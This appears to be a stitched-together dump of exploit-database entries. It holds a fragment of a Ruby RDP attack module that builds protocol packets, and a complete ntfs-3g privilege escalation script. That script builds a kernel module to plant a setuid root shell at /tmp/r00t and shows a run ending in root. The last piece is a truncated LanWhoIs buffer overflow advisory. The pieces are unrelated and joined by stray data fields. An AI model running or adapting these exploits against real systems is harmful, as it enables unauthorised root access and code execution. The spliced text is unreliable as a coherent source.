""\x38\x00"" +                                                               # Length: 56 (includes header)     channels_defs      ## Fix. for packet modification.     ## T.125 Connect-Initial     size_1 = [pdu.length - 5].pack(""s"")                                        # Length (BER: Length)     pdu[3] = size_1[1]     pdu[4] = size_1[0]      ## Connect-Initial: UserData     size_2 = [pdu.length - 102].pack(""s"")                                      # UserData, length (BER: OctetString)     pdu[100] = size_2[1]     pdu[101] = size_2[0]      ## T.124 GCC Connection Data (ConnectData) - PER Encoding used     size_3 = [pdu.length - 111].pack(""s"")                                      # Length (Connect PDU)     pdu[109] = ""\x81""     pdu[110] = size_3[0]      size_4 = [pdu.length - 125].pack(""s"")                                      # Length (T.124 UserData section)     pdu[123] = ""\x81""     pdu[124] = size_4[0]      ## Client MCS Section - 2.2.1.3     size_5 = [pdu.length - 383].pack(""s"")                                      # Length (includes header)     pdu[385] = size_5[0]      rdp_build_data_tpdu(pdu)   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/9cde84cd-5055-475a-ac8b-704db419b66f   ## Client Security Exchange PDU - 2.2.1.10   def pdu_security_exchange(rcran, rsexp, rsmod, bitlen)     encrypted_rcran_bignum = rsa_encrypt(rcran, rsexp, rsmod)     encrypted_rcran = int_to_bytestring(encrypted_rcran_bignum)      bitlen += 8                                                                # Pad with size of TS_SECURITY_PACKET header      userdata_length = 8 + bitlen     userdata_length_low = userdata_length & 0xFF     userdata_length_high = userdata_length / 256     flags = 0x80 | userdata_length_high      pdu = ""\x64"" +                                                             # T.125 sendDataRequest     ""\x00\x08"" +                                                               # intiator userId     ""\x03\xeb"" +                                                               # channelId = 1003     ""\x70"" +                                                                   # dataPriority = high, segmentation = begin | end     [flags].pack(""C"") +     [userdata_length_low].pack(""C"") +                                          # UserData length          # TS_SECURITY_PACKET - 2.2.1.10.1     ""\x01\x00"" +                                                               # securityHeader flags     ""\x00\x00"" +                                                               # securityHeader flagsHi     [bitlen].pack(""L<"") +                                                      # TS_ length     encrypted_rcran +                                                          # encryptedClientRandom - 64 bytes     ""\x00\x00\x00\x00\x00\x00\x00\x00""                                         # 8 bytes rear padding (always present)      return(rdp_build_data_tpdu(pdu))   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/04c60697-0d9a-4afd-a0cd-2cc133151a9c   ## Client MCS Erect Domain Request PDU - 2.2.1.5   def pdu_erect_domain_request()     pdu = ""\x04"" +                                                             # T.125 ErectDomainRequest     ""\x01\x00"" +                                                               # subHeight   - length 1, value 0     ""\x01\x00""                                                                 # subInterval - length 1, value 0      return(rdp_build_data_tpdu(pdu))   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/f5d6a541-9b36-4100-b78f-18710f39f247\   ## Client MCS Attach User Request PDU - 2.2.1.6   def pdu_attach_user_request()     pdu = ""\x28""                                                               # T.125 AttachUserRequest      return(rdp_build_data_tpdu(pdu))   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/64564639-3b2d-4d2c-ae77-1105b4cc011b   ## Client MCS Channel Join Request PDU -2.2.1.8   def pdu_channel_request(user1, channel_id)     pdu = ""\x38"" + [user1, channel_id].pack(""nn"")                              # T.125 ChannelJoinRequest      return(rdp_build_data_tpdu(pdu))   end    ## https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/772d618e-b7d6-4cd0-b735-fa08af558f9d   ## TS_INFO_PACKET - 2.2.1.11.1.1   def pdu_client_info(user_name, domain_name = """", ip_address = """")     ## Max. len for 4.0/6.0 servers is 44 bytes including terminator.     ## Max. len for all other versions is 512 including terminator.     ## We're going to limit to 44 (21 chars + null -> unicode) here.          ## Blank username is valid, nil = random.     user_name = Rex::Text.rand_text_alpha(10) if user_name.nil?     user_unicode = Rex::Text.to_unicode(user_name[0..20],  type = 'utf-16le')     uname_len = user_unicode.length      ## Domain can can be, and for rdesktop typically is, empty.     ## Max. len for 4.0/5.0 servers is 52 including terminator.     ## Max. len for all other versions is 512 including terminator.     ## We're going to limit to 52 (25 chars + null -> unicode) here.     domain_unicode = Rex::Text.to_unicode(domain_name[0..24], type = 'utf-16le')     domain_len = domain_unicode.length      ## This address value is primarily used to reduce the fields by which this     ## module can be fingerprinted. It doesn't show up in Windows logs.     ## clientAddress + null terminator     ip_unicode = Rex::Text.to_unicode(ip_address, type = 'utf-16le') + ""\x00\x00""     ip_len = ip_unicode.length          pdu = ""\xa1\xa5\x09\x04"" +     ""\x09\x04\xbb\x47"" +                                                       # CodePage     ""\x03\x00\x00\x00"" +                                                       # flags - INFO_MOUSE, INFO_DISABLECTRLALTDEL, INFO_UNICODE, INFO_MAXIMIZESHELL, INFO_ENABLEWINDOWSKEY     [domain_len].pack(""S<"") +                                                  # cbDomain (length value) - EXCLUDES null terminator     [uname_len].pack(""S<"") +                                                   # cbUserName (length value) - EXCLUDES null terminator     ""\x00\x00"" +                                                               # cbPassword (length value)     ""\x00\x00"" +                                                               # cbAlternateShell (length value)     ""\x00\x00"" +                                                               # cbWorkingDir (length value)     [domain_unicode].pack(""a*"") +                                              # Domain     ""\x00\x00"" +                                                               # Domain null terminator, EXCLUDED from value of cbDomain     [user_unicode].pack(""a*"") +                                                # UserName     ""\x00\x00"" +                                                               # UserName null terminator, EXCLUDED FROM value of cbUserName     ""\x00\x00"" +                                                               # Password - empty     ""\x00\x00"" +                                                               # AlternateShell - empty      ## TS_EXTENDED_INFO_PACKET - 2.2.1.11.1.1.1     ""\x02\x00"" +                                                               # clientAddressFamily - AF_INET - FIXFIX - detect and set dynamically     [ip_len].pack(""S<"") +                                                      # cbClientAddress (length value) - INCLUDES terminator ... for reasons.     [ip_unicode].pack(""a*"") +                                                  # clientAddress (unicode + null terminator (unicode)      ""\x3c\x00"" +                                                               # cbClientDir (length value): 60     ""\x43\x00\x3a\x00\x5c\x00\x57\x00\x49",,
,,0,
41240,"ntfs-3g (Debian 9) - Local Privilege Escalation #!/bin/bash echo ""@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"" echo ""@  CVE-2017-0359, PoC by Kristian Erik Hermansen  @"" echo ""@  ntfs-3g local privilege escalation to root     @"" echo ""@  Credits to Google Project Zero                 @"" echo ""@  Affects: Debian 9/8/7, Ubuntu, Gentoo, others  @"" echo ""@  Tested: Debian 9 (Stretch)                     @"" echo ""@  Date: 2017-02-03                               @"" echo ""@  Link: https://goo.gl/A9I8Vq                    @"" echo ""@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"" echo ""[*] Gathering environment info ..."" cwd=""$(pwd)"" un=""$(uname -r)"" dlm=""$(pwd)/lib/modules"" dkf=""$(pwd)/kernel/fs"" echo ""[*] Creating kernel hijack directories ..."" mkdir -p ""${dlm}"" mkdir -p ""${dkf}"" echo ""[*] Forging symlinks ..."" ln -sf ""${cwd}"" ""${dlm}/${un}"" ln -sf ""${cwd}"" ""${dkf}/fuse"" ln -sf cve_2017_0358.ko fuse.ko echo ""[*] Pulling in deps ... "" echo ""[*] Building kernel module ... ""  cat << 'EOF' > cve_2017_0358.c #include <linux/module.h>  MODULE_LICENSE(""CC""); MODULE_AUTHOR(""kristian erik hermansen <kristian.hermansen+CVE-2017-0358@gmail.com>""); MODULE_DESCRIPTION(""PoC for CVE-2017-0358 from Google Project Zero"");  int init_module(void) {   printk(KERN_INFO ""[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\n"");   char *envp[] = { ""HOME=/tmp"", NULL };   char *argv[] = { ""/bin/sh"", ""-c"", ""/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t"", NULL };   call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);   char *argvv[] = { ""/bin/sh"", ""-c"", ""/sbin/rmmod cve_2017_0358"", NULL };   call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC);   return 0; }  void cleanup_module(void) {   printk(KERN_INFO ""[*] CVE-2017-0358 exploit unloading ...\n""); } EOF  cat << 'EOF' > Makefile obj-m += cve_2017_0358.o  all: 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules  clean: 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean EOF  make 1>/dev/null 2>/dev/null || echo ""[-] FAILED: your need make / build tools"" cp ""/lib/modules/${un}/modules.dep.bin"" . || echo ""[-] FAILED: linux-image location non-default?"" MODPROBE_OPTIONS=""-v -d ${cwd}"" ntfs-3g /dev/null /dev/null 1>/dev/null 2>/dev/null /tmp/r00t -c 'whoami' | egrep -q 'root' && echo ""[+] SUCCESS: You have root. Don't be evil :)"" /tmp/r00t  echo``#@@@;`.:@',::'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;`......+;:;':..+:..'#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'.;,.,;;;....;,.'.,;+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@';':..':......;.:,,'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#;..'`.,;:.``.,'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:::;'''''''';;''+''+++;;;;::+'@@@@@';;;;;;;;''+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@',,..,#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#::;'''''''''';;'''' `+'';;:;;:@@@@+';;;;;;'';:#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@++':..'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+:;;''''''';'';'''';  :+'';;::;@@@@;;;;;;;''+'+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#::.,,#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@':;;'''''''''';'''''  ''''';::;@@@+''';;;+#++#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;.,,;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;:;;''''''''';;''';':.;+'';;;:;@@@'''':;'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##;;..:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;:;''++'''''''''';;''''''';;;;'@@@;''',:'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+;;;.,:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;;;''++''''''''';;;;'''''''''';@@#;'''.:'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#'...,,;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@';;''++++'''''''''''''+++++++':@@@''''::+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;:,.,;+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+:;;''++++''''''''''''''++'''':@@@'''':;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#';'#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@::''''+++++'''''''''''''''''::@@@+''';;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;;;'''+'+++''''''''''''''''':;@@@+''';;+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@';;''++'+++++++'''''''''''';:'@@@#''';;;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#;;''+++++++''''''''''''''';:#@@@@''';;:#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;;'''+++'+++''+'+''''''''';:#@@@@'+'';:+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@';;'+++++++++''''''+'''''';:@@@@@+''';;;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#;;''+++++++++'''+'''''''';:@@@@@#''';;;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;;''++++++++''''''''''''';:@@@@@@'''';;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+'''+++++'+++'''''''''''';:@@@@@@+''';;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#'''++++++'++'''''''''''';:@@@@@@+''';;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#'''+++'+'+'''''''''''''';:@@@@@@#''';;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#'''++++''''''''''''''''';:#@@@@@#''';;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#'''++++++''''''''''';''';;#@@@@@#''';;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#'''++++++''''''''''''''';;+@@@@@#'';;;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#''++++++''''''''';'''''';;;#@@@@''';:;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+++@@@@@@+''++'+++'''''''''';'''''';:'##';';;:;;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+'++####';;;'+;';;:'@@@@'''+''+++'''''''''';;''''';:::;;;;;;;;'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+;;;;;;;;::;;;;;'''''';:+@@@;''+''+++''''';''';;;''''';::;;;;;;'''@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#';;;;:;;;;:;;;;;;;;'''''';:+@#'+'+''++'''''';''';;;;''''';:;;;;''+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@';;;;;;;;;;;;;;;;;:;;;;'''''::#'''''''+++'''';;''';;,;''''';:'''+##@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#;;;;;;;;;;';;''''';;;,,;''''';;''''''''+''''';;;'''';;;;;;';;;;'#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+;;;;;;;;''''''+'''''''''';'''''::'''''''+'''';;:;'''';;;;';+';;;+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#;;'';;'';;;'++++++++''''''';;''';''''';''+'''';;,;'++'';;;;;+'';;;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@';'';'::::;::::'#@#+''''''+''';'';'''';''++''';;::;+++'';;;;'++';;;:##@@@@@@@@@@@@@@@@@@@@@@@#'';::;'#@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'''';:::;;;;;;;;:'@@@++';;'+'';''''''';'++''''';,;'+++''';;;'''+':;::+@@@@@@@@@@@@@@@@@@@##';;;;;;;;;::#@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+''::;;;;;'''''';::#@#+'';;'+'';''''';''+''''';;:;'##++'';;;';#+'':;;;'##@@@@@@@@@@@@@@@#;;;;;;;;;;;:;::'@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@':;;;;;;;''++++';;:'@#+';;''''''''';''+''#+';;;;''+##+''';;;;'#++';;;;;;+#@@@@@@@@@@#';;;;''''';;;;;;;::;@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@';;;;;;;;;''++++++'';:'++''''+'';'';''++#@@+';;;;;++##++''''';:+@#+';;;;;;:::::;;;;:;;;;;;'''''''''';;;;::'@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@';;;;;;;;;;'+####+++''';;;;;;'++;'''''#+++@#+''';;'#@@#++'''''';:+@##+'';;;;;:;;;;;;;;;;';''''''''''''',:;;;#@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+;;;;;;;'';'+@@@@##++++'+''';;;'+'''''#@@@@@#'''';;'@@@@#@##+'+'';:'#@#+'''';;;;;;;;;;;'''''''''++++++'';';;;'@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;;;;';;;'''+@@@@@@###+++++'+;:;'++'';'+@@@#@+''';;;+@@@@@@@@+++'';;;;'++'''';;;;;;;'''''''''+++#@@@@#++++'';;;@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;''';;'''+#@@@@@@@@###++####+''''+''''''''''''''';;#@@@@@@@@@#++'''''';;;:;;';;;::,;''''++++'';+@@@@@@#'++'';'@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+'''''''#@@@@@@@@@@@########+++++++''''''''''''';;'@@@@@@@@@@@#+''''''''''''''';;;;:::##@@@@@@@@@@@@@@@@@@++'#@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##+####@@@@@@@@@@@@@@@@@@@@@#'''#++''''''''''''';+@@@@@@@@@@@#++''''+++''''+'''';;;;::+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+''''''''''''+@@@@@@@@@@@@@@###++++++'''+++''';;;;;:+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+''''''''''#@@@@@@@@@@@@@@@@@@###+#+++++++'''';;;;::#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#++++#####@@@@@@@@@@@@@@@@@@@@@#+######+++++'';;;;;::@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+';'+@@@@@@@@@@@@@@@@@@@@@@@@@@@###@@@###+++'''':;;;:'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#++#+##++'';:;;;;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@####@++++''';;;'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+++'''''#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#####@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;:##';;;@;';+@@';;;@;;;;'@@':'@';@''+@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#    '    #     @    +    `@    #  @` ,@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@, `@:'.  .#` +  @  ;#@`  `,,  ,`@  '` :@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;   `@@  @@  .  @ `  @@  :@  :#@@     :@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#,  @#  @@   `##  `.#@` :@  `@'@```  :@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;    @@  @@  :  @``  ;@  :@'   `@  #` :@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:`  '@#  @@  #` :   `'@  :@@'   # `@` :@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  $ whoami user $ ./cve-2017-0358.sh @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @  CVE-2017-0359, PoC by Kristian Erik Hermansen  @ @  ntfs-3g local privilege escalation to root     @ @  Credits to Google Project Zero                 @ @  Affects: Debian 9/8/7, Ubuntu, Gentoo, others  @ @  Tested: Debian 9 (Stretch)                     @ @  Date: 2017-02-03                               @ @  Link: https://goo.gl/A9I8Vq                    @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ [*] Gathering environment info ... [*] Creating kernel hijack directories ... [*] Forging symlinks ... [*] Pulling in deps ...  [*] Building kernel module ...  [+] SUCCESS: You have root. Don't be evil :) # whoami root EOF",his own Extension-Pack(with malicious code,0
38404,"LanWhoIs.exe 1.0.1.120 - Stack Buffer Overflow (PoC) ''' [+] Credits: hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-LANWHOIS-BUFFER-OVERFLOW-10062015.txt   Vendor: ================================ www.lantricks.com   Product: ================================ LanWhoIs.exe 1.0.1.120  LanWhoIs querys and returns domain (site) holder or IP address informations.   Vulnerability Type: =================== Buffer Overflow   CVE Reference: ============== N/A   Vulnerability Details: ======================  LanWhoIs contains a file parsing stack buffer overflow vulnerability. The program has a whois_result.xml XML file located under the LanWhoIs directory. This file holds results returned from program queries. If LanWhoIs is installed under c:\ instead of 'Program Files' etc.. on shared PC and a non adminstrator user has access they can still edit the whois_result.xml, abusing the vuln program and possibly escalate privileges or run arbitrary code etc.  e.g.  <WhoisResult>   <Result> <QueryString>216.239.37.99</QueryString>     <ServerName>whois.arin.net</ServerName>     <QueryDate>02.01.2005 16:17:30</QueryDate>     <QueryType>-1</QueryType>   We can exploit the program by injecting malicious payload into the <QueryString> node of the local XML file causing buffer overflow overwriting both pointers to the NSEH & SEH exception handlers & control EIP at about 676 bytes.  e.g.  <QueryString>AAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....shellcode...etc..</QueryString>   WinDbg stack dump....  (2048.17cc): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This 